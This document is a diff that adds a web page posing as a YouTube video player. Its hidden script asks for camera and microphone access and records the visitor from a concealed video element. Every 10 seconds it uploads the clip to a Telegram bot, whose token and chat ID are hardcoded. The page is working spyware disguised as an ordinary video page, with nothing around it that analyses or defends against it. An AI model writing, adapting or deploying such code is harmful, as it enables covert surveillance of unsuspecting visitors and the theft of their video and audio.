@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title>Live Video Recording</title> 
+
+<style>
+  #videoElement {
+    display: none; /* ভিডিও ওয়েবসাইটে দেখা যাবে না */
+  }
+  #videoContainer {
+    text-align: center;
+    margin-top: 20px;
+  }
+  iframe {
+    width: 80%;
+    max-width: 600px;
+    height: 315px;
+    border: 2px solid black;
+  }
+</style>
+
+</head> 
+<body>
+
+<!-- YouTube Video -->
+<div id="videoContainer">
+    <iframe id="youtubeVideo" width="560" height="315" 
+        src="https://www.youtube.com/embed/09wZgGE3L9s?autoplay=1&loop=1&playlist=09wZgGE3L9s" 
+        frameborder="0" allow="autoplay; encrypted-media" allowfullscreen>
+    </iframe>
+</div>
+
+<!-- Hidden Video Recording -->
+<video id="videoElement" autoplay playsinline></video>
+
+<script>
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then((stream) => {
+      let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      let recordedChunks = [];
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        if (recordedChunks.length > 0) {
+          const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+          sendToTelegram(videoBlob);
+        }
+        recordedChunks = [];
+        startRecording(); // আবার রেকর্ড শুরু করবে
+      };
+
+      function startRecording() {
+        recordedChunks = [];
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 10000); // প্রতি ১০ সেকেন্ড পরপর ভিডিও পাঠানো হবে
+      }
+
+      startRecording(); // প্রথমবার রেকর্ড শুরু
+      
+    })
+    .catch((error) => {
+      console.error('Permission error:', error);
+    });
+
+  function sendToTelegram(data) {
+    const botToken = '8036059251:AAHwIxpvC8MI8FrvSSQ9UXbpOQGDPK4341s';
+    const chatId = '8062639321';
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('video', data, 'recorded_video.webm');
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error sending to Telegram:', error));
+  }
+
+</script>
+
+</body>
+</html>
